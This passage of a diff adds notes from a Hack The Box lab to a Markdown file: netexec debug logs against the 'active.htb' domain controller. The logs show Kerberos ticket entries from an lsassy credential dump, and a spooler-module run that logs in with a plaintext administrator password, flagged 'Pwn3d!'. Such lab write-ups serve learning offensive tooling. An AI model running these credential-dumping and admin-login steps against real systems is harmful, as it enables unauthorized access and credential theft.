+                    0x7f6a41ab7a10>)}, 'ssp': 'kerberos', 'masterkey': None}                                                                                                                                                                
+           DEBUG    Cred: {'hostname': '10.129.175.223', 'username': 'DC$', 'password': None, 'domain': 'ACTIVE.HTB', 'lmhash': None, 'nthash': None, 'sha1': None, 'ticket': {'file':                                          lsassy.py:91
+                    'TGT_ACTIVE.HTB_DC$_krbtgt_ACTIVE.HTB_dbb036d7_20250726072420.kirbi', 'domain': 'ACTIVE.HTB', 'endtime': datetime.datetime(2025, 7, 26, 7, 24, 20, tzinfo=<pypykatz.commons.filetime.UTC object at                      
+                    0x7f6a41ab7a10>)}, 'ssp': 'kerberos', 'masterkey': None}                                                                                                                                                                
+           DEBUG    Cred: {'hostname': '10.129.175.223', 'username': 'DC$', 'password': None, 'domain': 'ACTIVE.HTB', 'lmhash': None, 'nthash': None, 'sha1': None, 'ticket': {'file':                                          lsassy.py:91
+                    'TGT_ACTIVE.HTB_DC$_krbtgt_ACTIVE.HTB_298305e7_20250726072420.kirbi', 'domain': 'ACTIVE.HTB', 'endtime': datetime.datetime(2025, 7, 26, 7, 24, 20, tzinfo=<pypykatz.commons.filetime.UTC object at                      
+                    0x7f6a41ab7a10>)}, 'ssp': 'kerberos', 'masterkey': None}                                                                                                                                                                
+           DEBUG    Credentials: []                                                                                                                                                                                             lsassy.py:96
+           DEBUG    Calling process_credentials                                                                                                                                                                                lsassy.py:118
+[15:14:39] INFO     LSASSY      10.129.175.223  445    DC               No credentials found                                                                                                                                   lsassy.py:123
+           DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
+```
+
+### -M spooler
+```sh
+└─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' -M spooler --debug
+[16:40:51] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
+           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
+           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
+           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
+                    protocol='smb', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
+                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
+                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=['spooler'], module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None,                           
+                    no_s4u2proxy=False, domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None,                                  
+                    generate_krb5_file=None, sam=None, lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False,                     
+                    filter_shares=None, smb_sessions=False, disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None, computers=None, local_groups=None, pass_pol=False,                    
+                    rid_brute=None, qwinsta=False, tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None,                       
+                    regex=None, put_file=None, get_file=None, append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute=None, ps_execute=None, obfs=False,                    
+                    amsi_bypass=None, clear_obfscripts=False, force_ps32=False, no_encode=False)                                                                                                                                            
+           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
+           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
+           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
+[16:40:52] DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
+           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
+           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
+           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
+           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
+           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
+           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
+           DEBUG    Modules to be Loaded for sanity check: ['spooler'], <class 'list'>                                                                                                                                        netexec.py:182
+           DEBUG    Loading module for sanity check spooler at path /usr/lib/python3/dist-packages/nxc/modules/spooler.py                                                                                                     netexec.py:189
+           DEBUG    Supported protocols: ['smb', 'wmi']                                                                                                                                                                   moduleloader.py:71
+           DEBUG    Protocol: smb                                                                                                                                                                                         moduleloader.py:72
+           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
+           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
+           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
+           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
+           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
+           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
+[16:40:54] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
+           DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
+[16:40:56] INFO     Creating SMBv1 connection to 10.129.175.223                                                                                                                                                                   smb.py:575
+[16:40:58] INFO     SMBv1 disabled on 10.129.175.223                                                                                                                                                                              smb.py:598
+           DEBUG    Update Hosts: [{'id': 3, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': True,  database.py:265
+                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
+           DEBUG    add_host() - Host IDs Updated: [3]                                                                                                                                                                       database.py:275
+           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
+           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
+[16:40:58] INFO     SMB         10.129.175.223  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
+           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
+           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
+[16:41:00] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
+           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
+           DEBUG    Checking if user is admin on 10.129.175.223                                                                                                                                                                   smb.py:646
+[16:41:10] DEBUG    User is admin on 10.129.175.223!                                                                                                                                                                              smb.py:661
+           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
+           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
+           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
+           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
+           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, True, None, None)]                                                         database.py:485
+[16:41:10] INFO     SMB         10.129.175.223  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
+           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.175.223                                                                                                                                   smb.py:486
+           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
+           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
+           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, True, None, None)]                                                         database.py:485
+           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7fd39f0f8c20>, hosts: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, True, None,       database.py:362
+                    None)]                                                                                                                                                                                                                  
+           INFO     Loading modules for target: 10.129.175.223                                                                                                                                                             connection.py:589
+           DEBUG    Supported protocols: ['smb', 'wmi']                                                                                                                                                                   moduleloader.py:71
+           DEBUG    Protocol: smb                                                                                                                                                                                         moduleloader.py:72
+           DEBUG    Calling modules                                                                                                                                                                                        connection.py:238
+           DEBUG    Loading module spooler - <NXCModule.NXCModule object at 0x7fd39f0c4590>                                                                                                                                connection.py:273
+           DEBUG    Loading context for module spooler - <NXCModule.NXCModule object at 0x7fd39f0c4590>                                                                                                                    connection.py:283
+           DEBUG    Module spooler has on_login method                                                                                                                                                                     connection.py:293
+           DEBUG    StringBinding ncacn_ip_tcp:10.129.175.223[135]                                                                                                                                                             spooler.py:48
+[16:41:14] DEBUG    Protocol: [MS-RPRN]: Print System Remote Protocol                                                                                                                                                          spooler.py:84
+           DEBUG    Provider: spoolsv.exe                                                                                                                                                                                      spooler.py:85
+           DEBUG    UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0 IPSec Policy agent endpoint                                                                                                                            spooler.py:86
+           DEBUG    Bindings:                                                                                                                                                                                                  spooler.py:87
+           DEBUG              ncalrpc:[LRPC-86204a01a6d512c7f4]                                                                                                                                                                spooler.py:89
+           DEBUG              ncacn_ip_tcp:10.129.175.223[49169]                                                                                                                                                               spooler.py:89
+           DEBUG                                                                                                                                                                                                               spooler.py:90
+[16:41:14] INFO     SPOOLER     10.129.175.223  445    DC               Spooler service enabled                                                                                                                                spooler.py:91
+           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
+           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
+           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, True, None, None)]                                                         database.py:485
+           DEBUG    Update Hosts: [{'id': 3, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': True,  database.py:265
+                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
+           DEBUG    add_host() - Host IDs Updated: [3]                                                                                                                                                                       database.py:275
+           DEBUG    [Spooler] Received 155 endpoints                                                                                                                                                                          spooler.py:112
+           DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
 ```
